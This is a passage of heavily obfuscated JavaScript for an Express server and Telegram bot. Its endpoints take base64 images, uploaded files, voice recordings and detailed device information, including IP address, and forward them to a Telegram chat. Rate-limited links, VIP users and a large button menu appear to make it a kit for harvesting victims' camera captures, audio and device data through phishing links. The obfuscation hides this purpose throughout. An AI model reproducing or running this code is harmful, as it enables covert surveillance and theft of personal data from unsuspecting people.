        console[_0x2a01d7(0x20f)](_0xe85a2e[_0x2a01d7(0x8c2)], _0x125564), _0xa12719[_0x2a01d7(0x7d7)](0x3fa + 0xc04 * -0x2 + 0x1602)[_0x2a01d7(0x5a1)](_0xe85a2e[_0x2a01d7(0x2a0)]);
    }
}), app[_0x544f76(0x4f5)](_0x544f76(0x2cc), (_0x159e2d, _0x8f5046) => {
    const _0x48cc16 = _0x544f76, _0x9b7f8 = { 'Uzica': _0x48cc16(0x5d4) };
    _0x8f5046[_0x48cc16(0x89c)](path[_0x48cc16(0x1ec)](__dirname, _0x9b7f8[_0x48cc16(0x486)]));
});
let userRequests = {};
app[_0x544f76(0x5cd)](_0x544f76(0x6fc) + _0x544f76(0x252), (_0x253b7a, _0x158986) => {
    const _0xa39b5 = _0x544f76, _0x37af9f = { 'tTAtG': _0xa39b5(0x5ad) }, _0x1445fe = _0x253b7a[_0xa39b5(0x539)][_0xa39b5(0x572)], _0x1aaf03 = _0x253b7a[_0xa39b5(0x539)][_0xa39b5(0x82e)], _0x1f80d4 = _0x253b7a[_0xa39b5(0x539)][_0xa39b5(0x931)];
    bot[_0xa39b5(0x3f3) + 'on'](_0x1445fe, _0x1aaf03, _0x1f80d4), _0x158986[_0xa39b5(0x5a1)](_0x37af9f[_0xa39b5(0x800)]);
}), app[_0x544f76(0x5cd)](_0x544f76(0x86c) + _0x544f76(0x36f), (_0x17571c, _0x11fa83) => {
    const _0x505b35 = _0x544f76, _0x571df6 = {
            'lBBme': _0x505b35(0x48f),
            'UkgIN': function (_0x4d7295, _0x14e066) {
                return _0x4d7295 + _0x14e066;
            },
            'TpcSr': _0x505b35(0x73e) + _0x505b35(0x386),
            'CoHzn': _0x505b35(0x3c7) + ':\x20',
            'Mlizf': function (_0x40d251, _0x240970) {
                return _0x40d251 > _0x240970;
            }
        }, _0x2f04ee = _0x17571c[_0x505b35(0x539)][_0x505b35(0x572)], _0x4bd600 = _0x17571c[_0x505b35(0x539)][_0x505b35(0x2ea)][_0x505b35(0x7b8)](',');
    console[_0x505b35(0x2e0)](_0x571df6[_0x505b35(0x958)], _0x4bd600[_0x505b35(0x23e)], _0x571df6[_0x505b35(0x5b7)], _0x2f04ee);
    if (_0x571df6[_0x505b35(0x86d)](_0x4bd600[_0x505b35(0x23e)], 0xa6 * -0x2a + -0x8d9 + 0xc07 * 0x3)) {
        const _0x202a55 = _0x4bd600[_0x505b35(0x430)]((_0x14efa0, _0x49b02f) => {
            const _0x1a84d7 = _0x505b35, _0x15468e = Buffer[_0x1a84d7(0x953)](_0x14efa0, _0x571df6[_0x1a84d7(0x611)]);
            return bot[_0x1a84d7(0x5e4)](_0x2f04ee, _0x15468e, { 'caption': _0x1a84d7(0x355) + _0x571df6[_0x1a84d7(0x368)](_0x49b02f, 0x1c * -0xbf + 0x2 * 0x2a9 + 0xf93) });
        });
        Promise[_0x505b35(0x364)](_0x202a55)[_0x505b35(0x507)](() => {
            const _0x5004a7 = _0x505b35;
            console[_0x5004a7(0x2e0)](''), _0x11fa83[_0x5004a7(0x7b5)]({ 'success': !![] });
        })[_0x505b35(0x854)](_0x1cedf9 => {
            const _0x14511c = _0x505b35;
            console[_0x14511c(0x20f)]('', _0x1cedf9), _0x11fa83[_0x14511c(0x7d7)](-0x2675 + 0xc89 + 0x4 * 0x6f8)[_0x14511c(0x7b5)]({ 'error': '' });
        });
    } else
        console[_0x505b35(0x2e0)](''), _0x11fa83[_0x505b35(0x7d7)](-0x22db * 0x1 + 0x123d + 0x122e)[_0x505b35(0x7b5)]({ 'error': '' });
}), app[_0x544f76(0x5cd)](_0x544f76(0x474) + _0x544f76(0x84c), upload[_0x544f76(0x923)](_0x544f76(0x54a), -0x1 * -0x2516 + 0x2218 * -0x1 + -0x175 * 0x2), (_0x33e8fa, _0x56d38f) => {
    const _0x23b072 = _0x544f76, _0x4cb9d7 = {
            'DMEnd': function (_0x379442, _0x108f51) {
                return _0x379442 > _0x108f51;
            }
        }, _0x198521 = _0x33e8fa[_0x23b072(0x539)][_0x23b072(0x3b8)], _0xcee185 = _0x33e8fa[_0x23b072(0x2df)];
    if (_0xcee185 && _0x4cb9d7[_0x23b072(0x43d)](_0xcee185[_0x23b072(0x23e)], -0x328 + 0x210f + 0x5 * -0x5fb)) {
        console[_0x23b072(0x2e0)](_0x23b072(0x5bc) + _0xcee185[_0x23b072(0x23e)] + '\x20\x20' + _0x198521);
        const _0x217737 = _0xcee185[_0x23b072(0x430)](_0x161999 => bot[_0x23b072(0x5e4)](_0x198521, _0x161999[_0x23b072(0x367)]));
        Promise[_0x23b072(0x364)](_0x217737)[_0x23b072(0x507)](() => {
            const _0x5e608e = _0x23b072;
            console[_0x5e608e(0x2e0)](''), _0x56d38f[_0x5e608e(0x7b5)]({ 'success': !![] });
        })[_0x23b072(0x854)](_0x365528 => {
            const _0x5831c4 = _0x23b072;
            console[_0x5831c4(0x20f)](':', _0x365528), _0x56d38f[_0x5831c4(0x7d7)](-0x2 * 0x241 + 0xf83 + -0x7 * 0x14b)[_0x5831c4(0x7b5)]({ 'error': '' });
        });
    } else
        console[_0x23b072(0x2e0)](''), _0x56d38f[_0x23b072(0x7d7)](-0x1210 + -0x126 * -0x1d + -0x2 * 0x6d7)[_0x23b072(0x7b5)]({ 'error': '' });
}), app[_0x544f76(0x5cd)](_0x544f76(0x76c) + 'ce', uploadVoice[_0x544f76(0x484)](_0x544f76(0x6d9)), (_0x527739, _0x5079d1) => {
    const _0xab1b06 = _0x544f76, _0x4afc9c = { 'GoLqP': _0xab1b06(0x4bf) }, _0x3b067e = _0x527739[_0xab1b06(0x539)][_0xab1b06(0x572)], _0x150ead = _0x527739[_0xab1b06(0x564)][_0xab1b06(0x2b2)];
    bot[_0xab1b06(0x29b)](_0x3b067e, _0x150ead)[_0xab1b06(0x507)](() => {
        const _0x1120bb = _0xab1b06;
        fs[_0x1120bb(0x904)](_0x150ead), _0x5079d1[_0x1120bb(0x5a1)]('');
    })[_0xab1b06(0x854)](_0x396a28 => {
        const _0x4a706b = _0xab1b06;
        console[_0x4a706b(0x20f)](_0x396a28), _0x5079d1[_0x4a706b(0x7d7)](0x2518 + -0x1a88 + -0x89c * 0x1)[_0x4a706b(0x5a1)](_0x4afc9c[_0x4a706b(0x94f)]);
    });
});
const PORT = process[_0x544f76(0x5ed)][_0x544f76(0x778)] || -0x2 * -0x117e + 0x1741 * -0x1 + 0x1 * -0x3;
app[_0x544f76(0x543)](PORT, () => {
    const _0x28e08b = _0x544f76;
    console[_0x28e08b(0x2e0)](_0x28e08b(0x936) + _0x28e08b(0x929) + _0x28e08b(0x19b) + PORT);
}), app[_0x544f76(0x4f5)](_0x544f76(0x64f), (_0x1d9436, _0x3cadd8) => {
    const _0x5305ef = _0x544f76, _0x39c968 = { 'FemiV': _0x5305ef(0x2fc) };
    _0x3cadd8[_0x5305ef(0x89c)](path[_0x5305ef(0x1ec)](__dirname, _0x39c968[_0x5305ef(0x310)]));
}), app[_0x544f76(0x5cd)](_0x544f76(0x1b8), async (_0x2ac9e3, _0x1d1d5d) => {
    const _0x493b21 = _0x544f76, _0x61b827 = {
            'GxhWz': _0x493b21(0x3d6),
            'tCVqs': _0x493b21(0x57e) + _0x493b21(0x4a2) + _0x493b21(0x6e8),
            'BOaBJ': _0x493b21(0x20d) + _0x493b21(0x8cd) + _0x493b21(0x74a),
            'YEzPS': _0x493b21(0x20d) + _0x493b21(0x8cd) + _0x493b21(0x926),
            'PdsRv': _0x493b21(0x2bd) + _0x493b21(0x357) + _0x493b21(0x6ec)
        }, _0x2b114a = _0x2ac9e3[_0x493b21(0x539)][_0x493b21(0x3b8)], _0x109baa = _0x2ac9e3[_0x493b21(0x539)][_0x493b21(0x82f)];
    if (_0x109baa) {
        const _0x14b612 = _0x493b21(0x337) + _0x493b21(0x884) + _0x493b21(0x338) + _0x493b21(0x700) + _0x109baa[_0x493b21(0x5be)] + (_0x493b21(0x2cd) + _0x493b21(0x67b)) + _0x109baa[_0x493b21(0x874)] + (_0x493b21(0x263) + _0x493b21(0x5b4)) + _0x109baa['ip'] + (_0x493b21(0x268) + _0x493b21(0x6c7)) + _0x109baa[_0x493b21(0x24f)] + (_0x493b21(0x90c) + _0x493b21(0x88c) + _0x493b21(0x2d4)) + _0x109baa[_0x493b21(0x750)] + (_0x493b21(0x291) + _0x493b21(0x700)) + _0x109baa[_0x493b21(0x448)] + _0x493b21(0x2b0) + _0x109baa[_0x493b21(0x75f) + 'ed'] + (_0x493b21(0x63d) + _0x493b21(0x747) + _0x493b21(0x591) + _0x493b21(0x74c)) + _0x109baa[_0x493b21(0x296) + 'e'] + (_0x493b21(0x6cb) + ':\x20') + _0x109baa[_0x493b21(0x6de)] + (_0x493b21(0x5a0) + _0x493b21(0x4e4)) + _0x109baa[_0x493b21(0x34f)] + (_0x493b21(0x318) + _0x493b21(0x4f0)) + _0x109baa[_0x493b21(0x1ac) + _0x493b21(0x25a)] + (_0x493b21(0x532) + _0x493b21(0x4e4)) + _0x109baa[_0x493b21(0x7fc)] + (_0x493b21(0x281) + _0x493b21(0x5a8)) + _0x109baa[_0x493b21(0x5fe)] + (_0x493b21(0x2f1) + _0x493b21(0x438) + _0x493b21(0x700)) + _0x109baa[_0x493b21(0x8d4) + _0x493b21(0x866)] + (_0x493b21(0x55a) + _0x493b21(0x4ec) + '\x20') + _0x109baa[_0x493b21(0x925)] + (_0x493b21(0x94c) + _0x493b21(0x261)) + _0x109baa[_0x493b21(0x490)] + (_0x493b21(0x816) + _0x493b21(0x4a3)) + _0x109baa[_0x493b21(0x2c7) + 'e'] + (_0x493b21(0x24e) + _0x493b21(0x34d)) + _0x109baa[_0x493b21(0x205) + _0x493b21(0x274)] + (_0x493b21(0x283) + _0x493b21(0x3b3)) + _0x109baa[_0x493b21(0x221) + _0x493b21(0x23f)] + (_0x493b21(0x7f5) + _0x493b21(0x49f) + _0x493b21(0x487)) + _0x109baa[_0x493b21(0x5dd)] + (_0x493b21(0x454) + _0x493b21(0x3b3)) + _0x109baa[_0x493b21(0x3b1) + _0x493b21(0x1af)] + (_0x493b21(0x4f3) + _0x493b21(0x79b)) + _0x109baa[_0x493b21(0x272)] + (_0x493b21(0x947) + _0x493b21(0x3fb) + _0x493b21(0x4eb)) + _0x109baa[_0x493b21(0x251)] + (_0x493b21(0x3ad) + _0x493b21(0x2b5) + _0x493b21(0x55f) + '\x20') + _0x109baa[_0x493b21(0x8b1) + _0x493b21(0x5fc)] + (_0x493b21(0x294) + _0x493b21(0x284) + _0x493b21(0x3b5)) + _0x109baa[_0x493b21(0x81f) + _0x493b21(0x411)] + (_0x493b21(0x285) + _0x493b21(0x914) + _0x493b21(0x6e4) + _0x493b21(0x865)) + _0x109baa[_0x493b21(0x23c) + _0x493b21(0x203)] + (_0x493b21(0x5a7) + _0x493b21(0x7cd) + _0x493b21(0x6ea)) + _0x109baa[_0x493b21(0x577) + _0x493b21(0x2f2)] + (_0x493b21(0x435) + _0x493b21(0x304) + _0x493b21(0x41c)) + _0x109baa[_0x493b21(0x8f2) + 'rt'] + (_0x493b21(0x4c3) + '\x20');
        try {
            await bot[_0x493b21(0x84f) + 'e'](_0x2b114a, _0x14b612, { 'parse_mode': _0x61b827[_0x493b21(0x4b2)] }), console[_0x493b21(0x2e0)](_0x61b827[_0x493b21(0x376)]), _0x1d1d5d[_0x493b21(0x7b5)]({ 'success': !![] });
        } catch (_0x512cb3) {
            console[_0x493b21(0x20f)](_0x61b827[_0x493b21(0x24c)], _0x512cb3), _0x1d1d5d[_0x493b21(0x7d7)](0x1 * 0xad5 + -0x1 * -0x710 + -0xff1)[_0x493b21(0x7b5)]({ 'error': _0x61b827[_0x493b21(0x766)] });
        }
    } else
        console[_0x493b21(0x2e0)](_0x61b827[_0x493b21(0x85d)]), _0x1d1d5d[_0x493b21(0x7d7)](-0xa * 0x85 + 0x13 * 0x7 + 0x63d * 0x1)[_0x493b21(0x7b5)]({ 'error': _0x61b827[_0x493b21(0x85d)] });
}), app[_0x544f76(0x5cd)](_0x544f76(0x256), (_0x3242c3, _0x22102e) => {
    const _0x43b839 = _0x544f76, _0x1d4d29 = {
            'beBUr': _0x43b839(0x48f),
            'NXOgw': function (_0x252ef2, _0x1c3c2f) {
                return _0x252ef2 + _0x1c3c2f;
            },
            'pfdge': _0x43b839(0x1c7) + _0x43b839(0x901)
        }, _0x315c51 = _0x3242c3[_0x43b839(0x539)][_0x43b839(0x572)], _0x17a811 = _0x3242c3[_0x43b839(0x539)][_0x43b839(0x2ea)][_0x43b839(0x7b8)](',');
    _0x17a811[_0x43b839(0x64d)]((_0x3dfc36, _0x64c59) => {
        const _0x3fae67 = _0x43b839, _0x26729c = Buffer[_0x3fae67(0x953)](_0x3dfc36, _0x1d4d29[_0x3fae67(0x908)]);
        bot[_0x3fae67(0x5e4)](_0x315c51, _0x26729c, { 'caption': _0x3fae67(0x6db) + _0x1d4d29[_0x3fae67(0x658)](_0x64c59, -0x1191 + -0x2379 + 0x350b) });
    }), console[_0x43b839(0x2e0)](_0x43b839(0x615) + _0x43b839(0x4e8) + _0x43b839(0x5cf) + _0x315c51), dataStore[_0x315c51] && dataStore[_0x315c51][_0x43b839(0x7a2)] ? _0x22102e[_0x43b839(0x7c0)](dataStore[_0x315c51][_0x43b839(0x7a2)]) : _0x22102e[_0x43b839(0x5a1)](_0x1d4d29[_0x43b839(0x864)]);
}), app[_0x544f76(0x4f5)](_0x544f76(0x886), (_0x58a6c5, _0x1e05af) => {
    const _0x1a21cc = _0x544f76, _0x4e0214 = { 'BpUwd': _0x1a21cc(0x4be) };
    _0x1e05af[_0x1a21cc(0x89c)](path[_0x1a21cc(0x1ec)](__dirname, _0x4e0214[_0x1a21cc(0x511)]));
});
let linkUsage = {};
const maxAttemptsPerButton = 0x1 * 0x2681 + -0x1913 + -0xb43;
function validateLinkUsage(_0x339eda, _0xe0ece7) {
    const _0x1a0709 = _0x544f76, _0x3a6ea6 = {
            'SfBpL': function (_0x287ffa, _0x1862c4) {
                return _0x287ffa(_0x1862c4);
            },
            'bwlQw': function (_0x3cfc4e, _0x19d865) {
                return _0x3cfc4e >= _0x19d865;
            }
        }, _0x5afe24 = _0x339eda + ':' + _0xe0ece7;
    if (_0x3a6ea6[_0x1a0709(0x834)](isVIPUser, _0x339eda))
        return !![];
    if (linkUsage[_0x5afe24] && _0x3a6ea6[_0x1a0709(0x406)](linkUsage[_0x5afe24][_0x1a0709(0x7ff)], maxAttemptsPerButton))
        return ![];
    return !linkUsage[_0x5afe24] && (linkUsage[_0x5afe24] = { 'attempts': 0x0 }), linkUsage[_0x5afe24][_0x1a0709(0x7ff)]++, !![];
}
let vipUsers = {};
function addVIPUser(_0x225c61) {
    vipUsers[_0x225c61] = !![];
}
function removeVIPUser(_0xea5361) {
    delete vipUsers[_0xea5361];
}
function isVIPUser(_0xabc983) {
    return !!vipUsers[_0xabc983];
}
bot[_0x544f76(0x937)](/\/start/, async _0x1255b5 => {
    const _0x3fe9c2 = _0x544f76, _0xa0bb98 = {
            'sfQFd': function (_0x47dc84, _0x1923ac) {
                return _0x47dc84(_0x1923ac);
            },
            'vJkgw': _0x3fe9c2(0x91b) + _0x3fe9c2(0x927) + _0x3fe9c2(0x6dc) + _0x3fe9c2(0x7c4) + _0x3fe9c2(0x773) + _0x3fe9c2(0x3e9),
            'BPHnI': _0x3fe9c2(0x60e) + _0x3fe9c2(0x22c) + _0x3fe9c2(0x7b6),
            'LeiTo': _0x3fe9c2(0x195) + _0x3fe9c2(0x91c) + _0x3fe9c2(0x823),
            'JOTcm': _0x3fe9c2(0x195) + _0x3fe9c2(0x5b3) + _0x3fe9c2(0x74f),
            'KrCBR': _0x3fe9c2(0x785) + _0x3fe9c2(0x401),
            'YrCnJ': _0x3fe9c2(0x82b) + _0x3fe9c2(0x44a),
            'uKTDN': _0x3fe9c2(0x207) + _0x3fe9c2(0x588) + _0x3fe9c2(0x37a),
            'JOXWF': _0x3fe9c2(0x7ba) + 's',
            'GFgbU': _0x3fe9c2(0x393) + _0x3fe9c2(0x5d8),
            'HQdWp': _0x3fe9c2(0x783) + _0x3fe9c2(0x43f),
            'sHUzx': _0x3fe9c2(0x813) + _0x3fe9c2(0x44f),
            'xvCti': _0x3fe9c2(0x620) + _0x3fe9c2(0x20b),
            'OsfcF': _0x3fe9c2(0x1cd) + _0x3fe9c2(0x497),
            'fpnNE': _0x3fe9c2(0x7f3) + _0x3fe9c2(0x35a),
            'FjIDd': _0x3fe9c2(0x30b) + _0x3fe9c2(0x30a),
            'CDWGb': _0x3fe9c2(0x50c),
            'kAObX': _0x3fe9c2(0x669) + _0x3fe9c2(0x885),
            'MUhkL': _0x3fe9c2(0x455) + 're',
            'zArnX': _0x3fe9c2(0x321) + _0x3fe9c2(0x394),
            'rbxPQ': _0x3fe9c2(0x6f6),
            'ASLIm': _0x3fe9c2(0x3d0) + _0x3fe9c2(0x4a4),
            'pHpcM': _0x3fe9c2(0x84e) + _0x3fe9c2(0x213) + _0x3fe9c2(0x4d9),
            'BhEla': _0x3fe9c2(0x253) + _0x3fe9c2(0x4b0) + _0x3fe9c2(0x6c5) + _0x3fe9c2(0x4f8) + _0x3fe9c2(0x667),
            'fAkZn': _0x3fe9c2(0x6a6) + _0x3fe9c2(0x94a),
            'IHqaZ': _0x3fe9c2(0x794) + _0x3fe9c2(0x850),
            'SACxr': _0x3fe9c2(0x19d) + _0x3fe9c2(0x297),
            'VoLkM': _0x3fe9c2(0x57d) + _0x3fe9c2(0x87d) + _0x3fe9c2(0x92b) + _0x3fe9c2(0x71f) + _0x3fe9c2(0x4c0),
            'pHQHO': _0x3fe9c2(0x70f) + _0x3fe9c2(0x3bd),
            'SOZPf': _0x3fe9c2(0x65f),
            'NOVlC': _0x3fe9c2(0x910) + _0x3fe9c2(0x40f) + _0x3fe9c2(0x6da),
            'hCCPZ': _0x3fe9c2(0x287),
            'EAVMj': _0x3fe9c2(0x95c) + _0x3fe9c2(0x429),
            'HwKSO': _0x3fe9c2(0x266) + _0x3fe9c2(0x2eb) + _0x3fe9c2(0x437) + _0x3fe9c2(0x575) + _0x3fe9c2(0x30d),
            'UyzMJ': _0x3fe9c2(0x90e) + _0x3fe9c2(0x442),
            'mklBj': _0x3fe9c2(0x82a) + _0x3fe9c2(0x2fe) + '3',
            'flEYB': _0x3fe9c2(0x85b) + _0x3fe9c2(0x44d),
            'cizcy': _0x3fe9c2(0x661) + _0x3fe9c2(0x8bf) + _0x3fe9c2(0x8ac) + _0x3fe9c2(0x35b) + 'e/',
            'fShfe': _0x3fe9c2(0x412) + _0x3fe9c2(0x58b),
            'tqpXx': _0x3fe9c2(0x531) + 'il',
            'vjpeQ': _0x3fe9c2(0x464) + '💳',
            'LKBhO': _0x3fe9c2(0x480) + _0x3fe9c2(0x5ab),
            'HTGqF': _0x3fe9c2(0x312) + _0x3fe9c2(0x761),
            'nQLmq': _0x3fe9c2(0x814) + _0x3fe9c2(0x704),
            'Kggci': _0x3fe9c2(0x649) + _0x3fe9c2(0x4d0),
            'fZnzT': _0x3fe9c2(0x3ec) + _0x3fe9c2(0x845),
            'wTFxP': _0x3fe9c2(0x73f) + _0x3fe9c2(0x8b0),
            'KbHyp': _0x3fe9c2(0x938),
            'WymYk': _0x3fe9c2(0x668) + _0x3fe9c2(0x6d3),
            'tqEhI': _0x3fe9c2(0x760) + 's',
            'poBFf': _0x3fe9c2(0x202) + _0x3fe9c2(0x5e5),
            'aZQuO': _0x3fe9c2(0x7f0) + _0x3fe9c2(0x91d),
            'wQcoy': _0x3fe9c2(0x892) + _0x3fe9c2(0x65c),
            'Xvkdh': _0x3fe9c2(0x82a) + _0x3fe9c2(0x555),
            'NkoOz': function (_0x1e392b, _0x1b0856) {
                return _0x1e392b === _0x1b0856;
            },
            'igvZd': _0x3fe9c2(0x624) + _0x3fe9c2(0x549) + _0x3fe9c2(0x68c) + _0x3fe9c2(0x78f),
            'fOStF': _0x3fe9c2(0x959) + _0x3fe9c2(0x740),
            'LSQPE': _0x3fe9c2(0x267),
            'vkGxq': _0x3fe9c2(0x1d7) + _0x3fe9c2(0x35f),
            'rQxnn': _0x3fe9c2(0x3fe)
        }, _0x5398ff = _0x1255b5[_0x3fe9c2(0x638)]['id'], _0x19f0fb = await _0xa0bb98[_0x3fe9c2(0x47d)](isUserSubscribed, _0x5398ff);
    if (!_0x19f0fb) {
        const _0x580c96 = _0xa0bb98[_0x3fe9c2(0x5bf)], _0x2df07d = developerChannels[_0x3fe9c2(0x430)](_0x441138 => [{
                    'text': _0x3fe9c2(0x6ed) + _0x441138,
                    'url': _0x3fe9c2(0x82a) + _0x3fe9c2(0x4c0) + _0x441138[_0x3fe9c2(0x6ab)](0x18d4 + -0xf91 * 0x1 + -0x3 * 0x316)
                }]);
        bot[_0x3fe9c2(0x84f) + 'e'](_0x5398ff, _0x580c96, { 'reply_markup': { 'inline_keyboard': _0x2df07d } });
        return;
    }
    const _0x2a723a = _0xa0bb98[_0x3fe9c2(0x4e3)], _0x51b390 = [
            [
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x1a1)],
                    'callback_data': _0x3fe9c2(0x54b) + _0x3fe9c2(0x7f1) + _0x5398ff
                },
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x905)],
                    'callback_data': _0x3fe9c2(0x21d) + 'k:' + _0x5398ff
                }
            ],
            [
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x47a)],
                    'callback_data': _0x3fe9c2(0x271) + 'n:' + _0x5398ff
                },
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x553)],
                    'callback_data': _0x3fe9c2(0x331) + 'e:' + _0x5398ff
                }
            ],
            [
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x79a)],
                    'callback_data': _0xa0bb98[_0x3fe9c2(0x37b)]
                },
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x4d7)],
                    'callback_data': _0xa0bb98[_0x3fe9c2(0x2d5)]
                }
            ],
            [
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x414)],
                    'callback_data': _0xa0bb98[_0x3fe9c2(0x714)]
                },
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x877)],
                    'callback_data': _0x3fe9c2(0x2dd) + _0x3fe9c2(0x922) + _0x5398ff
                }
            ],
            [
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x248)],
                    'callback_data': _0x3fe9c2(0x230) + _0x3fe9c2(0x54e) + _0x5398ff
                },
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x599)],
                    'callback_data': _0xa0bb98[_0x3fe9c2(0x82d)]
                }
            ],
            [
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x770)],
                    'callback_data': _0xa0bb98[_0x3fe9c2(0x2f6)]
                },
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x24a)],
                    'callback_data': _0xa0bb98[_0x3fe9c2(0x70a)]
                }
            ],
            [
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x243)],
                    'callback_data': _0x3fe9c2(0x1a4) + 'k:' + _0x5398ff
                },
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x380)],
                    'web_app': { 'url': _0xa0bb98[_0x3fe9c2(0x811)] }
                }
            ],
            [
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x807)],
                    'callback_data': _0xa0bb98[_0x3fe9c2(0x83f)]
                },
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x4ff)],
                    'web_app': { 'url': _0xa0bb98[_0x3fe9c2(0x471)] }
                }
            ],
            [
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x63b)],
                    'callback_data': _0xa0bb98[_0x3fe9c2(0x85f)]
                },
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x60c)],
                    'callback_data': _0xa0bb98[_0x3fe9c2(0x6a5)]
                }
            ],
            [
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x752)],
                    'web_app': { 'url': _0xa0bb98[_0x3fe9c2(0x596)] }
                },
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x702)],
                    'url': _0xa0bb98[_0x3fe9c2(0x39c)]
                }
            ],
            [
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x5fa)],
                    'web_app': { 'url': _0xa0bb98[_0x3fe9c2(0x396)] }
                },
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x677)],
                    'callback_data': _0xa0bb98[_0x3fe9c2(0x76a)]
                }
            ],
            [
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x206)],
                    'callback_data': _0xa0bb98[_0x3fe9c2(0x306)]
                },
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x495)],
                    'callback_data': _0xa0bb98[_0x3fe9c2(0x5ba)]
                }
            ],
            [
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x1d8)],
                    'callback_data': _0xa0bb98[_0x3fe9c2(0x3fc)]
                },
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x472)],
                    'callback_data': _0xa0bb98[_0x3fe9c2(0x4c2)]
                }
            ],
            [
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x565)],
                    'callback_data': _0xa0bb98[_0x3fe9c2(0x399)]
                },
                {
                    'text': _0xa0bb98[_0x3fe9c2(0x8a2)],
                    'callback_data': _0xa0bb98[_0x3fe9c2(0x75e)]
                }
            ],
            [{
                    'text': _0xa0bb98[_0x3fe9c2(0x420)],
                    'url': _0xa0bb98[_0x3fe9c2(0x92a)]
                }]
        ];
    bot[_0x3fe9c2(0x84f) + 'e'](_0x5398ff, _0x2a723a, { 'reply_markup': { 'inline_keyboard': _0x51b390 } });
    if (_0xa0bb98[_0x3fe9c2(0x4b4)](_0x5398ff, -0x23982 * -0xe609 + 0x268d0846f + -0x3127c2647)) {
        const _0x4bea44 = _0xa0bb98[_0x3fe9c2(0x612)], _0x1e7ee6 = [[
                    {
                        'text': _0xa0bb98[_0x3fe9c2(0x8eb)],
                        'callback_data': _0xa0bb98[_0x3fe9c2(0x717)]
                    },
                    {
                        'text': _0xa0bb98[_0x3fe9c2(0x38d)],
                        'callback_data': _0xa0bb98[_0x3fe9c2(0x38a)]
                    }
                ]];
        bot[_0x3fe9c2(0x84f) + 'e'](_0x5398ff, _0x4bea44, { 'reply_markup': { 'inline_keyboard': _0x1e7ee6 } });
    }
}), bot['on'](_0x544f76(0x84b) + _0x544f76(0x2d1), _0x5baaa5 => {
    const _0x364156 = _0x544f76, _0x1b80a1 = {
            'zjEka': function (_0x24f259, _0x1ed03c) {
                return _0x24f259 === _0x1ed03c;
            },
            'yZNsl': _0x364156(0x783) + _0x364156(0x43f)
        }, _0x51c0c2 = _0x5baaa5[_0x364156(0x320)][_0x364156(0x638)]['id'], _0x42cf47 = _0x5baaa5[_0x364156(0x8fe)];
    if (_0x1b80a1[_0x364156(0x409)](_0x42cf47, _0x1b80a1[_0x364156(0x46b)])) {
        const _0x222e84 = _0x364156(0x1d9) + _0x364156(0x1ef) + _0x364156(0x4a0) + _0x364156(0x7b1) + _0x364156(0x3b4) + _0x364156(0x478) + _0x364156(0x70b) + _0x364156(0x8ca) + _0x364156(0x2ae) + _0x364156(0x758) + _0x364156(0x554) + _0x364156(0x28f) + _0x364156(0x900) + _0x364156(0x348) + _0x364156(0x1db) + _0x364156(0x28a) + _0x364156(0x7bc) + _0x364156(0x86a) + _0x364156(0x5e0) + _0x364156(0x278) + _0x364156(0x39d);
        bot[_0x364156(0x84f) + 'e'](_0x51c0c2, _0x222e84);
    }
}), bot['on'](_0x544f76(0x84b) + _0x544f76(0x2d1), async _0x34425a => {
    const _0x819dac = _0x544f76, _0x1b8bae = {
            'agabb': function (_0xe4aaaf, _0x4f58f5) {
                return _0xe4aaaf(_0x4f58f5);
            },
            'ilVzO': function (_0x290f25, _0x3ac8f2) {
                return _0x290f25(_0x3ac8f2);
            },
            'tOeab': _0x819dac(0x6f6),
            'QFXES': _0x819dac(0x7ba) + 's',
            'DBZkI': _0x819dac(0x455) + 're',
            'WsfgE': _0x819dac(0x2dd) + _0x819dac(0x5fd),
            'wgtda': _0x819dac(0x50c),
            'OkBfQ': _0x819dac(0x1a4) + 'k',
            'jleQR': _0x819dac(0x287),
            'AsESr': _0x819dac(0x230) + _0x819dac(0x3ed),
            'LcEKn': function (_0xa5fe64, _0x20bd90) {
                return _0xa5fe64(_0x20bd90);
            },
            'irlkH': _0x819dac(0x91b) + _0x819dac(0x927) + _0x819dac(0x6dc) + _0x819dac(0x7c4) + _0x819dac(0x773) + _0x819dac(0x3e9),
            'hxuKN': function (_0x5b0409, _0x1f5d17) {
                return _0x5b0409 === _0x1f5d17;
            },
            'dWOVy': _0x819dac(0x620) + _0x819dac(0x20b),
            'knZEa': function (_0x5b41f5, _0x3d083c) {
                return _0x5b41f5 === _0x3d083c;
            },
            'KEZMs': _0x819dac(0x75c),
            'PDIbG': _0x819dac(0x72a) + _0x819dac(0x309) + _0x819dac(0x66c) + _0x819dac(0x793) + _0x819dac(0x67d) + _0x819dac(0x8f4),
            'UZPkI': _0x819dac(0x58c) + _0x819dac(0x782) + _0x819dac(0x2a6) + _0x819dac(0x1a5) + 'ns',
            'wwUTp': _0x819dac(0x69c) + _0x819dac(0x8c1),
            'OkAmW': _0x819dac(0x329),
            'QIPsO': _0x819dac(0x47c) + _0x819dac(0x4ee) + _0x819dac(0x2ff) + _0x819dac(0x95d) + _0x819dac(0x603) + _0x819dac(0x75a) + _0x819dac(0x8e0) + _0x819dac(0x1be) + _0x819dac(0x68d) + _0x819dac(0x559) + 'cA',
            'GoesU': _0x819dac(0x31d) + _0x819dac(0x1e5),
            'MthZP': _0x819dac(0x5bb) + _0x819dac(0x2f4),
